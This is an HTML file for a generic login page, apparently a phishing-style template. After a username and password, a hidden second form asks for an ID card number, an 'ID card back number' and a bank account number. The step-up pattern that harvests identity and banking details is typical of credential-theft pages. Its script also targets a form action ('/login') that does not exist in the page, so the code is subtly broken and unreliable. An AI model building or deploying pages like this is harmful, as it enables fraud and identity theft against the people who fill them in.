<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f3f4f6;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background: white;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            padding: 20px;
            width: 100%;
            max-width: 400px;
        }
        .login-container h2 {
            text-align: center;
            margin-bottom: 20px;
            color: #333;
        }
        .form-group {
            margin-bottom: 15px;
        }
        .form-group label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        .form-group input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 14px;
        }
        .form-group input:focus {
            outline: none;
            border-color: #6366f1;
            box-shadow: 0 0 4px rgba(99, 102, 241, 0.5);
        }
        .login-btn {
            width: 100%;
            padding: 10px;
            background-color: #6366f1;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        .login-btn:hover {
            background-color: #4f46e5;
        }
        .forgot-password {
            display: block;
            text-align: center;
            margin-top: 10px;
            color: #6366f1;
            text-decoration: none;
            font-size: 14px;
        }
        .forgot-password:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Login</h2>
        <form action="/identity" method="POST">
            <div class="form-group">
                <label for="username">Username</label>
                <input type="text" id="username" name="username" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit" class="login-btn">Login</button>
            <a href="#" class="forgot-password">Forgot Password?</a>
        </form>
    </div>

    <div class="login-container" style="margin-top: 20px; display: none;" id="identity-form">
        <h2>Identity Verification</h2>
        <form action="/submit_identity" method="POST">
            <div class="form-group">
                <label for="id-card">ID Card Number</label>
                <input type="text" id="id-card" name="id_card" required>
            </div>
            <div class="form-group">
                <label for="id-back">ID Card Back Number</label>
                <input type="text" id="id-back" name="id_back" required>
            </div>
            <div class="form-group">
                <label for="bank-account">Bank Account Number</label>
                <input type="text" id="bank-account" name="bank_account" required>
            </div>
            <button type="submit" class="login-btn">Submit</button>
        </form>
    </div>

    <script>
        document.querySelector('form[action="/login"]').addEventListener('submit', function(event) {
            event.preventDefault();
            document.querySelector('.login-container').style.display = 'none';
            document.getElementById('identity-form').style.display = 'block';
        });
    </script>
</body>
</html>
